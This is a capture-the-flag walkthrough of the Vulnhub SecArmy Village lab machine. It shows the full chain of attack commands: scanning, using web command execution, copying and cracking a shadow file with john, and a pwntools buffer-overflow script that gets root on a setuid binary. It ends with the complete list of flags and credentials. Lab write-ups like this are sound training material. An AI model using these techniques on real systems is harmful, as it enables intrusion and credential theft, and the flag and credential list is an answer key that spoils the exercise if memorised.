```
Author : gr33nm0nk2802
Date   : 31.10.2020
Title  : SecArmyVillage OSCP Giveaway 
```
Link to Download: [Vulnhub](https://www.vulnhub.com/entry/secarmy-village-grayhat-conference,585/)

--------------------------------------------------------------------------------------------------------------------------------

Work Environment: Virtualbox.

This box was vulnerable to several bugs and covered several topics: Reconnaisance,WEB, Crypto, Pwn, linux and basic Scripting.
The virtual box was hosted on my local network in Bridged mode.

-------------------------------------------------------------------------------------------------------------------------------

## Information Gathering

At first I started with a basic nmap scan on my network to identify the hosts up and running. At this moment, I have only 2 devices in my internal nework so, I should get 2 IPs

I started off by looking for my IP address. 

```
>> ifconfig
   
   wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
   inet 192.168.43.190  netmask 255.255.255.0  broadcast 192.168.43.255
   inet6 XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX  prefixlen 64  scopeid 0x0<global>
   inet6 XXXX::XXXX:XXXX:XXXX:XXXX  prefixlen 64  scopeid 0x20<link>
   inet6 XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX  prefixlen 64  scopeid 0x0<global>
   ether XX:XX:XX:XX:XX:XX  txqueuelen 1000  (Ethernet)
   RX packets 651401  bytes 701314221 (668.8 MiB)
   RX errors 0  dropped 0  overruns 0  frame 0
   TX packets 3887924  bytes 682889637 (651.2 MiB)
   TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

So, My internal network is 192.168.43.0 and subnet is 255.255.255.0

So, I tried to scan for all the hosts up inside my internal network. 192.168.43.0/24

```
>> nmap -sn 192.168.43.0/24

Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-31 12:24 IST
Nmap scan report for 192.168.43.71
Host is up (0.0046s latency).
Nmap scan report for 192.168.43.190
Host is up (0.00030s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 15.57 seconds

```

So, Our targe host IP is `192.168.43.71`

No lets scan for open ports and services running on the system.

```
>> nmap -vv -p- -sV -A -Pn 192.168.43.71 

   Scanning 192.168.43.71 [65535 ports]
   Discovered open port 21/tcp on 192.168.43.71
   Discovered open port 80/tcp on 192.168.43.71
   Discovered open port 22/tcp on 192.168.43.71
   Discovered open port 1337/tcp on 192.168.43.71

   PORT     STATE SERVICE REASON  VERSION
   21/tcp   open  ftp     syn-ack vsftpd 2.0.8 or later
   |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
   | ftp-syst: 
   |   STAT: 
   | FTP server status:
   |      Connected to ::ffff:192.168.43.190
   |      Logged in as ftp
   |      TYPE: ASCII
   |      No session bandwidth limit
   |      Session timeout in seconds is 300
   |      Control connection is plain text
   |      Data connections will be plain text
   |      At session startup, client count was 1
   |      vsFTPd 3.0.3 - secure, fast, stable
   |_End of status
   22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey: 
   |   2048 2c:54:d0:5a:ae:b3:4f:5b:f8:65:5d:13:c9:ee:86:75 (RSA)
   | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDohXQp1GDfbPVQcVJhhsEB+cvFcrs761CXkhJgvjtwoS3lpeKjRMqY/6/d8kV2zNx9ou3uKeKZHQG//p8tKehp64wScRML0W9FUQzpptHNcH2ywcGvNV1QrRf5bau05eZT2WcGVXq1Ibeh4LZ1LIei1uIa0YUjEiCwfe4cwIJeuOF8vPv9KZv/OGlXJGWh38kMPJVXLb1nCbwuiZH56C/cIv482pIe9CFCzFzGvTBbxwb2k1qdRly7HPNNYTFfCQou7aVMSiKMwsGXisG+WnTP06POGNE6TiD1VQqxxR+EODPWcSk3MLOARh5Boo55uFprWuI210tFMEv6gkyKMDZH
   |   256 0c:2b:3a:bd:80:86:f8:6c:2f:9e:ec:e4:7d:ad:83:bf (ECDSA)
   | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOMBQ+clmpDwAxGIXguBxm549vYge0bKMrH9x8PJ1U6efAn64eUK4utjCSHI4bOiDnW4bfTCoUFaENsMIkHOx98=
   |   256 2b:4f:04:e0:e5:81:e4:4c:11:2f:92:2a:72:95:58:4e (ED25519)
   |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJONlCWoe5Vm9EFXXjWVkTVLaentKWPTiLxZ7Z6HySX9
   80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
   | http-methods: 
   |_  Supported Methods: GET POST OPTIONS HEAD
   |_http-server-header: Apache/2.4.29 (Ubuntu)
   |_http-title: Totally Secure Website
   1337/tcp open  waste?  syn-ack
   | fingerprint-strings: 
   |   DNSStatusRequestTCP, GetRequest, HTTPOptions, Help, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
   |     Welcome to SVOS Password Recovery Facility!
   |     Enter the super secret token to proceed: 
   |     Invalid token!
   |     Exiting!
   |   DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck: 
   |     Welcome to SVOS Password Recovery Facility!
   |_    Enter the super secret token to proceed:
   1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
   SF-Port1337-TCP:V=7.91%I=7%D=10/31%Time=5F9D0B5F%P=x86_64-pc-linux-gnu%r(N
   SF:ULL,58,"\n\x20Welcome\x20to\x20SVOS\x20Password\x20Recovery\x20Facility
   SF:!\n\x20Enter\x20the\x20super\x20secret\x20token\x20to\x20proceed:\x20")
   SF:%r(GenericLines,58,"\n\x20Welcome\x20to\x20SVOS\x20Password\x20Recovery
   SF:\x20Facility!\n\x20Enter\x20the\x20super\x20secret\x20token\x20to\x20pr
   SF:oceed:\x20")%r(GetRequest,74,"\n\x20Welcome\x20to\x20SVOS\x20Password\x
   SF:20Recovery\x20Facility!\n\x20Enter\x20the\x20super\x20secret\x20token\x
   SF:20to\x20proceed:\x20\n\x20Invalid\x20token!\n\x20Exiting!\x20\n")%r(HTT
   SF:POptions,74,"\n\x20Welcome\x20to\x20SVOS\x20Password\x20Recovery\x20Fac
   SF:ility!\n\x20Enter\x20the\x20super\x20secret\x20token\x20to\x20proceed:\
   SF:x20\n\x20Invalid\x20token!\n\x20Exiting!\x20\n")%r(RTSPRequest,74,"\n\x
   SF:20Welcome\x20to\x20SVOS\x20Password\x20Recovery\x20Facility!\n\x20Enter
   SF:\x20the\x20super\x20secret\x20token\x20to\x20proceed:\x20\n\x20Invalid\
   SF:x20token!\n\x20Exiting!\x20\n")%r(RPCCheck,58,"\n\x20Welcome\x20to\x20S
   SF:VOS\x20Password\x20Recovery\x20Facility!\n\x20Enter\x20the\x20super\x20
   SF:secret\x20token\x20to\x20proceed:\x20")%r(DNSVersionBindReqTCP,58,"\n\x
   SF:20Welcome\x20to\x20SVOS\x20Password\x20Recovery\x20Facility!\n\x20Enter
   SF:\x20the\x20super\x20secret\x20token\x20to\x20proceed:\x20")%r(DNSStatus
   SF:RequestTCP,74,"\n\x20Welcome\x20to\x20SVOS\x20Password\x20Recovery\x20F
   SF:acility!\n\x20Enter\x20the\x20super\x20secret\x20token\x20to\x20proceed
   SF::\x20\n\x20Invalid\x20token!\n\x20Exiting!\x20\n")%r(Help,74,"\n\x20Wel
   SF:come\x20to\x20SVOS\x20Password\x20Recovery\x20Facility!\n\x20Enter\x20t
   SF:he\x20super\x20secret\x20token\x20to\x20proceed:\x20\n\x20Invalid\x20to
   SF:ken!\n\x20Exiting!\x20\n")%r(SSLSessionReq,74,"\n\x20Welcome\x20to\x20S
   SF:VOS\x20Password\x20Recovery\x20Facility!\n\x20Enter\x20the\x20super\x20
   SF:secret\x20token\x20to\x20proceed:\x20\n\x20Invalid\x20token!\n\x20Exiti
   SF:ng!\x20\n")%r(TerminalServerCookie,74,"\n\x20Welcome\x20to\x20SVOS\x20P
   SF:assword\x20Recovery\x20Facility!\n\x20Enter\x20the\x20super\x20secret\x
   SF:20token\x20to\x20proceed:\x20\n\x20Invalid\x20token!\n\x20Exiting!\x20\
   SF:n")%r(TLSSessionReq,74,"\n\x20Welcome\x20to\x20SVOS\x20Password\x20Reco
   SF:very\x20Facility!\n\x20Enter\x20the\x20super\x20secret\x20token\x20to\x
   SF:20proceed:\x20\n\x20Invalid\x20token!\n\x20Exiting!\x20\n");
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

So, looks like we have an ftp service running on port 21, ssh service on port 22, Http web server running on port 80 and an anonymous service running on the leet port 1337


## Vulnerability Assesment

I was able to do an anonymous login (anonymous:anonymous) onto the ftp server but didnt receive any valuable files neither was able to esclate priviledges.

So, I next tried to access the service on port 1337

```
>> nc 192.168.43.71

    Welcome to SVOS Password Recovery Facility!
    Enter the super secret token to proceed: abcd
   
    Invalid token!
    Exiting! 

``` 

This service asks for a token but, we dont have this token right now, but we will use this later.

So, next I did a nikto scan to look for any web vulnerabilities.

```
>>   nikto -h http://192.168.43.71
     - Nikto v2.1.6
     ---------------------------------------------------------------------------
     + Target IP:          192.168.43.71
     + Target Hostname:    192.168.43.71
     + Target Port:        80
     + Start Time:         2020-10-31 12:51:30 (GMT5.5)
     ---------------------------------------------------------------------------
     + Server: Apache/2.4.29 (Ubuntu)
     + The anti-clickjacking X-Frame-Options header is not present.
     + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
     + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
     + No CGI Directories found (use '-C all' to force check all possible dirs)
     + Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
     + Server may leak inodes via ETags, header found with file /, inode: 10b, size: 5afe5ae59ebfb, mtime: gzip
     + Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
     + OSVDB-3233: /icons/README: Apache default file found.
     + 7915 requests: 0 error(s) and 7 item(s) reported on remote host
     + End Time:           2020-10-31 12:52:22 (GMT5.5) (52 seconds)
     ---------------------------------------------------------------------------
     + 1 host(s) tested

```

So, We dont find any critical information. Now, lets try to open this in our browser

## Exploitation


### User 1
---

The website says:

```
   Welcome to the first task!
   
   You are required to find our hidden directory and make your way into the machine.
   G00dluck! 
```

So, I used gobuster and the dirb/common.txt file to access for hidden files and directories


```
>>  gobuster dir -u http://192.168.43.71 -w /usr/share/wordlists/dirb/common.txt
    
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://192.168.43.71
    [+] Threads:        10
    [+] Wordlist:       /usr/share/wordlists/dirb/common.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Timeout:        10s
    ===============================================================
    2020/10/31 12:58:46 Starting gobuster
    ===============================================================
    /.htpasswd (Status: 403)
    /anon (Status: 301)
    /.htaccess (Status: 403)
    /.hta (Status: 403)
    /index.html (Status: 200)
    /javascript (Status: 301)
    /server-status (Status: 403)
    ===============================================================
    2020/10/31 12:58:48 Finished
    ===============================================================

```

So, we are given an `anon` directory lets look into it.

Visiting this directory we get the credentials of the user,

```
uno:luc10r4m0n
```

Now, we use ssh to login as uno(1st User)

```
>>> ssh uno@192.168.43.71
    password:luc10r4m0n
```

Here we get our flag of user uno and a readme file

```
Congratulations!
Here's your first flag segment: flag1{fb9e88}
```

Opening the readme.txt 
```
Head over to the second user!
You surely can guess the username , the password will be:
4b3l4rd0fru705
```


### User 2
----

So, we can now switch our user level to dos(User 2) as the /etc/passwd has dos as the next user.

```
>> su dos
password: 4b3l4rd0fru705
```

Once we login as user dos we move to his home directory and then list the files

```
>> cd
>> ls -la
   
   drwx------  7 dos  dos    4096 Oct 29 19:51 .
   drwxr-xr-x 12 root root   4096 Oct 19 11:05 ..
   -rw-rw-r--  1 dos  dos      47 Oct  5 09:24 1337.txt
   -rw-------  1 dos  dos     612 Oct 29 19:51 .bash_history
   -rw-r--r--  1 dos  dos     220 Sep 22 11:36 .bash_logout
   -rw-r--r--  1 dos  dos    3771 Sep 22 11:36 .bashrc
   drwx------  2 dos  dos    4096 Sep 22 12:49 .cache
   drwx------  2 dos  dos    4096 Sep 22 13:59 .elinks
   drwxr-xr-x  2 dos  dos  135168 Oct 29 17:32 files
   drwx------  3 dos  dos    4096 Sep 22 12:49 .gnupg
   drwxrwxr-x  3 dos  dos    4096 Sep 22 13:24 .local
   -rw-r--r--  1 dos  dos     807 Sep 22 11:36 .profile
   -rw-rw-r--  1 dos  dos     104 Sep 23 09:52 readme.txt
   -rw-------  1 dos  dos     802 Oct 29 17:32 .viminfo
```
This 1337 has something which is going to help us later

```
>> cat 1337.txt

   Our netcat application is too 1337 to handle..
```

The readme.txt had certain string which we are to find in the files

```
>> cat readme.txt

    You are required to find the following string inside the files folder:
    a8211ac1853a1235d48829414626512a


```

When we move to the files directory we see a lot of files here. simply using cat and grep does not help so, instead 
I used 

```
>> cat * | less
```

now in this menu we look for string pattern `a8211ac1853a1235d48829414626512a`

```
   /a8211ac1853a1235d48829414626512a
```
helps us get the secret string and also tells us to look inside file3131.txt

Lets check its output

```
>> cat file3131.txt
```


When we decode this base64 encoded data we come to know this is an pkzip file
```
UEsDBBQDAAAAADOiO1EAAAAAAAAAAAAAAAALAAAAY2hhbGxlbmdlMi9QSwMEFAMAAAgAFZI2Udrg
tPY+AAAAQQAAABQAAABjaGFsbGVuZ2UyL2ZsYWcyLnR4dHPOz0svSiwpzUksyczPK1bk4vJILUpV
L1aozC8tUihOTc7PS1FIy0lMB7LTc1PzSqzAPKNqMyOTRCPDWi4AUEsDBBQDAAAIADOiO1Eoztrt
dAAAAIEAAAATAAAAY2hhbGxlbmdlMi90b2RvLnR4dA3KOQ7CMBQFwJ5T/I4u8hrbdCk4AUjUXp4x
IsLIS8HtSTPVbPsodT4LvUanUYff6bHd7lcKcyzLQgUN506/Ohv1+cUhYsM47hufC0WL1WdIG4WH
80xYiZiDAg8mcpZNciu0itLBCJMYtOY6eKG8SjzzcPoDUEsBAj8DFAMAAAAAM6I7UQAAAAAAAAAA
AAAAAAsAJAAAAAAAAAAQgO1BAAAAAGNoYWxsZW5nZTIvCgAgAAAAAAABABgAgMoyJN2U1gGA6WpN
3pDWAYDKMiTdlNYBUEsBAj8DFAMAAAgAFZI2UdrgtPY+AAAAQQAAABQAJAAAAAAAAAAggKSBKQAA
AGNoYWxsZW5nZTIvZmxhZzIudHh0CgAgAAAAAAABABgAAOXQa96Q1gEA5dBr3pDWAQDl0GvekNYB
UEsBAj8DFAMAAAgAM6I7USjO2u10AAAAgQAAABMAJAAAAAAAAAAggKSBmQAAAGNoYWxsZW5nZTIv
dG9kby50eHQKACAAAAAAAAEAGACAyjIk3ZTWAYDKMiTdlNYBgMoyJN2U1gFQSwUGAAAAAAMAAwAo
AQAAPgEAAAAA

```

We simply decode this data and redirect the output to a file and then extract the zip


```
>>>  echo "UEsDBBQDAAAAADOiO1EAAAAAAAAAAAAAAAALAAAAY2hhbGxlbmdlMi9QSwMEFAMAAAgAFZI2Udrg
     tPY+AAAAQQAAABQAAABjaGFsbGVuZ2UyL2ZsYWcyLnR4dHPOz0svSiwpzUksyczPK1bk4vJILUpV
     L1aozC8tUihOTc7PS1FIy0lMB7LTc1PzSqzAPKNqMyOTRCPDWi4AUEsDBBQDAAAIADOiO1Eoztrt
     dAAAAIEAAAATAAAAY2hhbGxlbmdlMi90b2RvLnR4dA3KOQ7CMBQFwJ5T/I4u8hrbdCk4AUjUXp4x
     IsLIS8HtSTPVbPsodT4LvUanUYff6bHd7lcKcyzLQgUN506/Ohv1+cUhYsM47hufC0WL1WdIG4WH
     80xYiZiDAg8mcpZNciu0itLBCJMYtOY6eKG8SjzzcPoDUEsBAj8DFAMAAAAAM6I7UQAAAAAAAAAA
     AAAAAAsAJAAAAAAAAAAQgO1BAAAAAGNoYWxsZW5nZTIvCgAgAAAAAAABABgAgMoyJN2U1gGA6WpN
     3pDWAYDKMiTdlNYBUEsBAj8DFAMAAAgAFZI2UdrgtPY+AAAAQQAAABQAJAAAAAAAAAAggKSBKQAA
     AGNoYWxsZW5nZTIvZmxhZzIudHh0CgAgAAAAAAABABgAAOXQa96Q1gEA5dBr3pDWAQDl0GvekNYB
     UEsBAj8DFAMAAAgAM6I7USjO2u10AAAAgQAAABMAJAAAAAAAAAAggKSBmQAAAGNoYWxsZW5nZTIv
     dG9kby50eHQKACAAAAAAAAEAGACAyjIk3ZTWAYDKMiTdlNYBgMoyJN2U1gFQSwUGAAAAAAMAAwAo
     AQAAPgEAAAAA" | base64 -d >> flag2.zip

>>>  7z x flag2.zip

>>>  cd challenge2
```

Here we get the flag for the user2 and the super secret token

```
>>> cat flag.txt

    Congratulations!
    
    Here's your second flag segment: flag2{624a21}
```

```
>>> cat todo.txt

    Although its total WASTE but... here's your super secret token: c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b
```

We can use this token in the password recovery service on port 1337

`c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b`


```
>>>  nc 192.168.43.71 1337   

     Welcome to SVOS Password Recovery Facility!
     Enter the super secret token to proceed: c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b
    
     Here's your login credentials for the third user tres:r4f43l71n4j3r0 

```

### User 3

We can use this credentials to login as the user tres(3rd User).

```
>>> su tres
    password: r4f43l71n4j3r0
```


After login as user tres

```
>>> ls
    flag3.txt  readme.txt  secarmy-village

>>> cat flag3.txt
    Congratulations! Here's your third flag segment: flag3{ac66cf}
```

Now we are given a binary which we can download from [here](https://mega.nz/file/XodTiCJD#YoLtnkxzRe_BInpX6twDn_LFQaQVnjQufFj3Hn1iEyU)

This binary has been packed using UPX and cant pe reversed easily. To solve this, I have first decode the upx using an inbuilt tool in kali

```
>>> upx -d secarmy-village
```

After unpacking, we can reverse the binary using the strings function

```
>>> strings secarmy-village
    Here's the credentials for the fourth user cuatro:p3dr00l1v4r3z
```

We can login to cutaro(4th User) using these credentials `cuatro:p3dr00l1v4r3z`

### User 4

```
>>  su cuatro
    password:p3dr00l1v4r3z 
>>  cd
>>  ls
    flag4.txt todo.txt

>>  cat flag4.txt 
    Congratulations, here's your 4th flag segment: flag4{1d6b06}

>> cat todo.txt 
   We have just created a new web page for our upcoming platform, its a photo gallery. You can check them out at /justanothergallery on the webserver.

```

So, we find another hidden directory `/justanothergallery`

Visiting this site gives us a list of qr, I viewed the source code and found that the images were named in serial order image-n.png where n {0,68}

I made a direcotry for this and downloaded all the qr using a quick bash oneliner

```
>>> for i in {0..68}; do wget "http://192.168.43.71/justanothergallery/qr/image-$i.png" -O $i.png ; done
```

Next I read the qr and then redirected the output to another file

```
>>> for i in {0..68}; do zbarimg  $i.png >> file ; done
```
Grepping for cinco gives us the password of cinco(5th User)

```
>>> cat file | grep 'cinco'
    QR-Code:cinco:ruy70m35
```
To view the entire message

```
>>> cat file | cut -d':' -f2 | tr '\n' ' '      
```

This tells us to look for the hidden directory of user

```
Hello and congrats for solving this challenge, we hope that you enjoyed the challenges we presented so far. It is time for us to increase the difficulty level and make the upcoming challenges more challenging than previous ones. Before you move to the next challenge, here are the credentials for the 5th user cinco head over to this user and get your 5th flag! goodluck for the upcoming challenges!      
``` 

### User 5

```
>>> su cinco
    password:ruy70m35
>>> cd
>>> cat flag5.txt 
    Congratulations! Here's your 5th flag segment: flag5{b1e870}
```

Next we move to a directory `cinco-secrets` directory under `/`  this directory has a backup of the shadow file, So we can simply copy this shadow file and the /etc/passwd into our machine using `scp`.

```
>>> scp cince@192.168.43.71:"/cinco-secrets/*" .
>>> scp cince@192.168.43.71:"/etc/passwd" .
```

After downloading the shadow and passwd file, we use unshadow to unshadow the file and then pass the output if unshadow to john and use the rockyou.txt wordlist to crack the password for sies(6th user)

```
>>> unshadow passwd shadow > john.txt

>>> john john.txt --wordlist=/usr/share/wordlists/rockyou.txt

```

The credentials for the 6th user`seis:Hogwarts`

### User 6

```
>>> su seis
    password:Hogwarts

>>> cd 
>>> ls
    flag6.txt  readme.txt

>>> cat flag6.txt 
    Congratulations! Here's your 6th flag segment: flag6{779a25}

>>> cat readme.txt 
    head over to /shellcmsdashboard webpage and find the credentials!

```

So, we find an hidden directory `/shellcmsdashboard`

On viewing the robots.txt page we get the credentials for admin login

```
http://192.168.43.71/shellcmsdashboard/robots.txt

Username: admin Password: qwerty
```

We can use these credentials to login.

It displays the message `head over to /aabbzzee.php`

This is the target for our next command execution vulnerability.

`http://192.168.43.71/shellcmsdashboard/aabbzzee.php`

We can see that the exec command followed by command executes the given command.
```
exec ls

aabbzzee.php index.php readme9213.txt robots.txt 

exec cat readme9213.txt 
```
this command fails on this file except all. So, we add readable permissions to the file and the reading the file again.

```
exec chmod 777 readme9213.txt
exec cat readme9213.txt
```

This dispalys `password for the seventh user is 6u1l3rm0p3n473 `

`siete:6u1l3rm0p3n473`

### User 7

```
>> su siete
   Password: 6u1l3rm0p3n473

>> cd 

>> ls
   flag7.txt  hint.txt  key.txt  message.txt  mighthelp.go  password.txt  password.zip

>> cat flag7.txt 
   Congratulations!
   Here's your 7th flag segment: flag7{d5c26a}
```

Now this part was a bit tricky and the go code is just a rabbithole and the hint confused me for a long time. Actually the go code simply takes a hex array and displays it as string.

The only thing of our importance is the key and the message.

We just have to xor the message with the key to get the flag.


We can just use these 2 lines in the python interpreter. Use the decimal equivalent of character 'x'

```
>>> li=[11,29,27,25,10,21,1,0,23,10,17,12,13,8]
>>> ''.join([ chr(c^120) for c in li])
'secarmyxoritup'
```

Now we can use this password to extract the archive.

```
>>> 7z x password.zip
    password: secarmyxoritup

>>> cat password.txt 
    the next user's password is m0d3570v1ll454n4
```

`ocho:m0d3570v1ll454n4`

### User 8


```
>> su ocho
   Password: m0d3570v1ll454n4

>> cd 

>> ls
   flag8.txt  keyboard.pcapng

>>  cat flag8.txt 
    Congratulations!
    Here's your 8th flag segment: flag8{5bcf53}
   
```

Next we download this keyboard.pcapng scp and look for the packets in wireshark.

```
>>>  scp ocho@192.168.43.71:"/home/ocho/*" .  
```

At first using strings on the pcap doesnt reveal any data also looking for the packets I did not find any valuable data. 
Then, I tried to export all the HTTP communication objects and this gave us a `none.txt` file.

After reading this file I found a secret string "mjwfr?2b6j3a5fx/" I tried to login with this but failed. Asked the author and they said I had correct string just needed to find the magic text. I tried again and again was about to giveup but then, I found a keyboad shift cipher on dcode.fr  [here](https://www.dcode.fr/keyboard-shift-cipher)

I used this and was so happy to crack this challenge after banging my head several times. Finally the credentials for `nueve:355u4z4rc0`

### User 9

```
>> su nueve
   Password: 355u4z4rc0

>> cd 

>> ls
   flag9.txt  orangutan  readme.txt

>>  cat flag9.txt 
    Congratulations!
    Here's your 9th flag segment: flag9{689d3e}
```

The final challenge is a pwn challenge and we can see that the `orangutan` binary has setuid bit turned on. So, exploiting it gives us root access.

Initially I downloaded the orangutan binary and exploited reversed the code in Ghidra

```
>>> scp nueve@192.168.43.71:"/home/nueve/orangutan" .
```

```
	int main(void)
    {
       char buffer [24];
       long check;
       
       check = 0;
       setbuf(stdout,(char *)0x0);
       setbuf(stdin,(char *)0x0);
       setbuf(stderr,(char *)0x0);
       puts("hello pwner ");
       puts("pwnme if u can ;) ");
       gets(buffer);
       if (check == 0xcafebabe) {
           setuid(0);
           setgid(0);
           seteuid(0);
           setegid(0);
           execvp("/bin/sh",(char **)0x0);
       }
       return 0;
    }
```

Also checked for the security measures of the binary.

```
>>> checksec orangutan
	Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```
>>> file orangutan
    orangutan: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cedba4c198b3199fd59348c775d1c6931dfdcb1c, not stripped
```

### User 10

Finally as i had python3 installed on the system, I downloaded pwntools and finally wrote an exploitation script.

```
>>> pip3 install pwntools

```

The ghidra code revealed the buffer size is 24 bytes and we use a gets function which has no limitation for the data size so, this can be exploited to write the check variable with the extra data overflown into the stack using the buffer variable.

```
#!/usr/bin/python3

from pwn import *

s=process("./orangutan")
payload=""
payload+="\x41"*24
payload+="\xbe\xba\xfe\xca"
print(payload)
s.sendline(payload)
s.interactive()
```

I wrote a script ape.py for this where I wrote 24 'A's into the buffer variable and supply 0xcafebabe in little indian format and then after sending the data we receive an interactive shell

```
>>>./ape.py
[+] Starting local process './orangutan': pid 2794
AAAAAAAAAAAAAAAAAAAAAAAA¾ºþÊ
[*] Switching to interactive mode
hello pwner 
pwnme if u can ;) 
$ whoami
root
$
```

hence we get a root user access.

Now I used passwd to change the password of the root user.

```
$ passwd
Enter new UNIX password: $ root
Retype new UNIX password: $ root
passwd: password updated successfully
```

Now I have access of the root user account. 
Lets login using these credentials.

```
>>> su root
    password: root

>>> cd /root

>>> ls
    pw.sh  root.txt  svos_password_recovery

>>> cat root.txt 
Congratulations!!!

You have finally completed the SECARMY OSCP Giveaway Machine

Here's your final flag segment: flag10{33c9661bfd}

Head over to https://secarmyvillage.ml/ for submitting the flags!

```

Hence we are a root user on this box now.

Thanks for reading.

-------------------------------------------------------------------------------------------------------------------------------------------------

# Flags:

flag1{fb9e88}
flag2{624a21}
flag3{ac66cf}
flag4{1d6b06}
flag5{b1e870}
flag6{779a25}
flag7{d5c26a}
flag8{5bcf53}
flag9{689d3e}
flag10{33c9661bfd}

# Credentials:

uno:luc10r4m0n
dos:4b3l4rd0fru705
tres:r4f43l71n4j3r0
cuatro:p3dr00l1v4r3z
cinco:ruy70m35
seis:Hogwarts
siete:6u1l3rm0p3n473
ocho:m0d3570v1ll454n4
nueve:355u4z4rc0
root:root

